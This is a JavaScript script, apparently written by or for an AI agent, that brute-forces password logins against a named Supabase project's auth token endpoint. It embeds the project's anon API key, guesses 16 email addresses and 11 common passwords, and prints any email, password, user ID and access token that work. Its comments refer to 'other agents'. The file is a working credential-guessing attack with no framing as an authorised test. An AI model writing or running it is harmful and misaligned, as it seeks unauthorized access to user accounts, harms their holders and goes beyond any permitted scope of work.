// Try to list users via Supabase admin endpoints
// Check GoTrue admin endpoint
const ref = 'pnnuqwdcgoympgddrvze';
const key = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBubnVxd2RjZ295bXBnZGRydnplIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA2MjgxNDgsImV4cCI6MjA4NjIwNDE0OH0.ovuhuCAdK3guWchqKDWK7MA-qv8cmhO0xdrGuv7M7fY';

// Try common user patterns used by other agents
const users = [
  'test@trifinity.dev', 'admin@trifinity.dev', 'badge-test@trifinity.dev',
  'badge85@trifinity.dev', 'badge85test@trifinity.dev', 'user@trifinity.dev',
  'dev@trifinity.dev', 'jan@trifinity.nl', 'test@example.com',
  'test1@test.com', 'user1@test.com', 'a@a.com', 'demo@demo.com',
  'testuser@test.com', 'test2@trifinity.dev', 'test3@trifinity.dev'
];

const passwords = [
  'test1234', 'Test1234!', 'password123', 'Badge85Test!',
  'admin1234', 'trifinity2026', '123456', 'password',
  'Test123!', 'testing123', 'Trifinity1!'
];

async function tryLogin(email, password) {
  try {
    const res = await fetch(`https://${ref}.supabase.co/auth/v1/token?grant_type=password`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'apikey': key },
      body: JSON.stringify({ email, password })
    });
    const d = await res.json();
    if (d.access_token) {
      return { email, password, userId: d.user?.id, token: d.access_token };
    }
  } catch(e) {}
  return null;
}

async function main() {
  console.log('Trying', users.length * passwords.length, 'combinations...');
  for (const email of users) {
    for (const pw of passwords) {
      const result = await tryLogin(email, pw);
      if (result) {
        console.log('FOUND USER!');
        console.log('Email:', result.email);
        console.log('Password:', result.password);
        console.log('User ID:', result.userId);
        console.log('Token:', result.token.substring(0, 80) + '...');
        process.exit(0);
      }
    }
  }
  console.log('No valid credentials found.');
}

main();
